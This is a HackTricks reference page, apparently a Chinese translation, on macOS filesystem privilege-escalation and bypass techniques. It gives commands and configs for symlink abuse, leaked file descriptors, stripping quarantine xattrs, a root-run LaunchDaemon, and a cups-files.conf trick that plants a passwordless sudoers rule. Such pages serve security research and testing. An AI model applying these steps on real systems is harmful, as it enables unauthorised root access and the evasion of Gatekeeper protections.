# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** 中的权限：

- **read** - 你可以**枚举**目录条目
- **write** - 你可以在目录中**删除/写入** **files**，并且可以**删除空文件夹**。
- 但是，除非你对非空文件夹拥有写权限，否则你**无法删除/修改非空文件夹**。
- 除非你拥有该文件夹，否则你**无法修改文件夹名称**。
- **execute** - 你被**允许遍历**该目录——如果你没有此权限，就无法访问其中的任何文件或任何子目录。

### Dangerous Combinations

**如何覆盖由 root 拥有的文件/文件夹**，但：

- 路径中的某个父**目录所有者**是该用户
- 路径中的某个父**目录所有者**是具有**写访问权限**的**users group**
- 某个 users **group** 对该**文件**拥有**写**访问权限

对于上述任意组合，攻击者都可以向预期路径**注入** **sym/hard link**，从而获得特权任意写入能力。

### Folder root R+X Special case

如果某个**directory**中存在只有 root 拥有 R+X 访问权限的文件，那么这些文件对其他任何人都**不可访问**。因此，如果存在某个漏洞，允许将一个用户可读、但由于该**限制**而无法读取的文件，从此文件夹**移动到其他位置**，则可以滥用该漏洞读取这些文件。

示例见：[https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

如果特权进程正在将数据写入一个可能由**低权限用户控制**，或可能已由低权限用户**预先创建**的**file**，则该用户只需通过 Symbolic 或 Hard link 将其**指向另一个文件**，特权进程就会向该文件写入数据。

请查看其他章节，了解攻击者可以在哪里**滥用任意写入来提升权限**。

### Open `O_NOFOLLOW`

根据 [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)：*"如果在掩码中使用了 `O_NOFOLLOW`，且传递给 `open()` 的目标文件是 symbolic link，则 `open()` 将失败。"* 只会检查**最终**组件——所有**中间**组件仍会被解析并跟随。因此，开发者即使使用 `O_NOFOLLOW` “保护”了写入操作，攻击者仍可以通过在目标路径的任意**父目录**中植入 symlink 来攻击。

同一 man page 记录了实际能够弥补这一缺陷的 flags：

- **`O_NOFOLLOW_ANY`** — *"如果……传递给 `open()` 的路径中任何组件是 symbolic link，则 `open()` 将失败。"*
- **`O_RESOLVE_BENEATH`** — *"如果……指定的路径解析逃逸出与 fd 关联的目录，则 `openat()` 将失败。"*

否则，使用相对于已验证目录 FD 的 `openat()`，或使用 `realpath()` 后重新验证，是阻止路径中间 symlink 交换的剩余方法。

## .fileloc

带有 **`.fileloc`** 扩展名的文件可以指向其他应用程序或 binaries，因此当它们被打开时，将执行对应的应用程序/binary。\
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 文件描述符

### Leak FD（无 `O_CLOEXEC`）

如果调用 `open` 时没有 `O_CLOEXEC` 标志，文件描述符就会被子进程继承。因此，如果特权进程打开了一个特权文件，并执行了由攻击者控制的进程，攻击者就会**继承指向该特权文件的 FD**。

典型示例是 **OS X 10.10 中的 `DYLD_PRINT_TO_FILE` LPE**（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)）：

- 即使是在**受限的（suid root）二进制文件**中，`dyld` 仍会处理 `DYLD_PRINT_TO_FILE=/path`，因为该变量是在 `processDyldEnvironmentVariable()` 之外解析的。
- 它执行了 `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`，因此会**在任意路径创建一个由 root 拥有的文件**。
- 该 FD **从未被关闭，也没有 close-on-exec 标志**，因此 suid 二进制文件的每个子进程都会继承一个**指向 root 所有文件的可写 FD**。
- 例如运行 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`，然后在子进程中读取继承的 FD 编号，即可任意写入 root 所有的文件；`fcntl(fd, F_SETFL, 0)` 甚至可以清除 `O_APPEND`，从而允许覆盖而不是追加。

每当特权进程在 `exec` 你所控制的程序之前打开文件时，都会出现类似情况（例如 helper tools、通过 `$EDITOR` 调用的 `crontab` 风格编辑器、从环境变量路径打开的日志/调试文件等）。使用以下命令枚举你继承的 FD：
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
任何高于 `2` 且指向你无法自行打开的文件的内容，都是 arbitrary-write（或 arbitrary-read）primitive。

## 避免 quarantine xattrs tricks

### 移除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

如果文件/文件夹具有此 immutable 属性，则无法为其设置 xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### 不支持 xattr 的文件系统

并非 macOS 能挂载的每个文件系统都原生存储 **extended attributes**。HFS+ 和 APFS 支持；**FAT32、exFAT 以及（大多数）NFS 挂载不支持**——macOS 会通过写入名为 `._<filename>` 的 **AppleDouble** side file 来模拟它们（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)）。

这对 quarantine 很重要，因为只有在 xattr 确实能够从同一卷中被写入**并读回**时，它才能保留：
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
如果稍后在会忽略 `._` 配套文件的路径上读取该卷（或者该配套文件被移除/删除），文件到达时将**不带 quarantine flag**——而一个未设置 quarantine 的 `.app` 就足以逃出 App Sandbox，详见 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)。

### writeextattr ACL

此 ACL 可防止向文件添加 `xattrs`。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 文件格式会复制文件及其 ACE。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示，会被设置为解压文件的 ACL。因此，如果你使用带有 AppleDouble 文件格式的 ACL 将应用程序压缩为 zip 文件，并且该 ACL 会阻止向其中写入其他 xattr……那么 quarantine xattr 就不会被设置到该应用程序中：

请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

要复现此问题，我们首先需要获取正确的 acl 字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（注意，即使这可行，sandbox 也会先写入 quarantine xattr）

并非真正需要，但我把它留在那里以防万一：

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

一些安全检查会检查二进制文件是否为 **platform binary**，例如允许其连接到 XPC service。不过，正如 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ 中关于 bypass 的内容所展示的，可以通过获取一个 platform binary（例如 /bin/ls），然后使用环境变量 `DYLD_INSERT_LIBRARIES` 通过 dyld 注入 exploit 来绕过此检查。

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

正在执行的二进制文件可以修改自身的 flags，从而通过类似以下代码绕过检查：
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## 绕过 Code Signatures

Bundle 包含文件 **`_CodeSignature/CodeResources`**，其中包含 **bundle** 中每个 **文件** 的 **hash**。请注意，CodeResources 的 hash 也会**嵌入可执行文件中**，所以我们也无法修改它。

不过，有些文件不会被检查签名，这些文件在 plist 中使用 `omit` 键标记，例如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
可以通过 CLI 计算资源的签名：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

用户可以挂载自定义的 dmg，甚至将其挂载到某些现有文件夹之上。以下是创建包含自定义内容的自定义 dmg package 的方法：
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常，macOS 通过与 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service 通信来挂载磁盘（该服务由 `/usr/libexec/diskarbitrationd` 提供）。如果将参数 `-d` 添加到 LaunchDaemons plist 文件并重启，它会将日志存储在 `/var/log/diskarbitrationd.log`。\
不过，也可以使用 `hdik` 和 `hdiutil` 等工具直接与 `com.apple.driver.DiskImages` kext 通信。

## 任意写入

### 周期性 sh 脚本

如果你的脚本可以被解释为 **shell script**，就可以覆盖 **`/etc/periodic/daily/999.local`** shell script，该脚本每天都会被触发。

你可以使用以下命令 **模拟执行此脚本**：**`sudo periodic daily`**

### Daemons

创建一个任意的 **LaunchDaemon**，例如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，并在 plist 中执行任意脚本，例如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
只需生成脚本 `/Applications/Scripts/privesc.sh`，其中包含你希望以 root 身份运行的 **commands**。

### Sudoers File

如果你拥有 **arbitrary write** 权限，可以在 **`/etc/sudoers.d/`** 文件夹中创建文件，从而授予自己 **sudo** 权限。

### PATH files

文件 **`/etc/paths`** 是填充 PATH 环境变量的主要位置之一。覆盖它需要 root 权限，但如果 **privileged process** 中的某个 script 正在执行不带完整路径的 **command**，你可能可以通过修改此文件来 **hijack** 它。

你也可以在 **`/etc/paths.d`** 中写入文件，以便将新文件夹加载到 `PATH` 环境变量中。

### cups-files.conf

此 technique 曾用于[这篇 writeup](https://www.kandji.io/blog/macos-audit-story-part1)。

创建文件 `/etc/cups/cups-files.conf`，内容如下：
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
这将创建文件 `/etc/sudoers.d/lpe`，权限为 777。末尾的额外垃圾内容用于触发错误日志创建。

然后，在 `/etc/sudoers.d/lpe` 中写入所需的配置，以提升权限，例如 `%staff ALL=(ALL) NOPASSWD:ALL`。

接着，再次修改 `/etc/cups/cups-files.conf`，指定 `LogFilePerm 700`，使新的 sudoers 文件在调用 `cupsctl` 时生效。

### Sandbox Escape

可以通过 FS arbitrary write 逃逸 macOS sandbox。有关示例，请查看页面 [macOS Auto Start](../../../../macos-auto-start-locations.md)，但一种常见方法是将 Terminal preferences 文件写入 `~/Library/Preferences/com.apple.Terminal.plist`，使其在启动时执行命令，然后使用 `open` 调用它。

## Generate writable files as other users

一种非常常见的 privesc primitive 是让**特权进程在你控制的目录中为你创建文件**，然后继续保留对该文件的**写入权限**。这需要两个条件：

1. 你拥有的目录（或可以在其中设置**可继承 ACL**），这样在其中创建的任何内容都会继承你的权限。
2. 一个特权进程/`suid` 进程，可以告知它在**何处**创建文件——通常通过 debug/logging 环境变量、配置文件或 helper 的 XPC API 实现。

**可继承 ACL**部分使你能够写入所创建的文件，即使该文件归其他用户所有。`file_inherit` / `directory_inherit` 继承标志记录在 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) 中：
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
现在，任何由特权进程在 `$DIRNAME` 中创建的文件都将**可由你写入**。如果该目录同时也是之后会以 **root 身份执行**的位置（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon directory 等），这就能直接实现 root 提权。有关在获得该文件后应写入的内容，请参阅上面的 [Sudoers 文件](#sudoers-file) 和 [cups-files.conf](#cups-filesconf) 部分。

有关“环境变量使 root 进程创建文件，而 FD 泄露给你”这一完整示例，请参阅上面的 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)。

## POSIX 共享内存

**POSIX 共享内存**允许符合 POSIX 标准的操作系统中的进程访问公共内存区域，与其他进程间通信方法相比，可以实现更快的通信。它通过 `shm_open()` 创建或打开共享内存对象，使用 `ftruncate()` 设置其大小，然后使用 `mmap()` 将其映射到进程的地址空间中。之后，进程可以直接读取和写入该内存区域。为了管理并发访问并防止数据损坏，通常会使用 mutex 或 semaphore 等同步机制。最后，进程使用 `munmap()` 和 `close()` 解除映射并关闭共享内存，还可以选择使用 `shm_unlink()` 删除内存对象。在多个进程需要快速访问共享数据的环境中，这种机制特别适合高效、快速的 IPC。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消费者代码示例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded Descriptors** 是 macOS 中引入的一项安全功能，用于增强用户应用中 **file descriptor operations** 的安全性和可靠性。这些 guarded descriptors 提供了一种将特定限制或“guards”与文件描述符关联的方法，并由内核强制执行。

此功能对于防止某些类型的安全漏洞尤其有用，例如 **unauthorized file access** 或 **race conditions**。当线程访问一个 file description，从而**使另一个存在漏洞的线程能够访问该 file description**，或者文件描述符被存在漏洞的子进程**继承**时，就可能出现此类漏洞。与此功能相关的一些函数包括：

- `guarded_open_np`: 使用 guard 打开一个 FD
- `guarded_close_np`: 关闭它
- `change_fdguard_np`: 更改描述符上的 guard flags（甚至移除 guard protection）

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
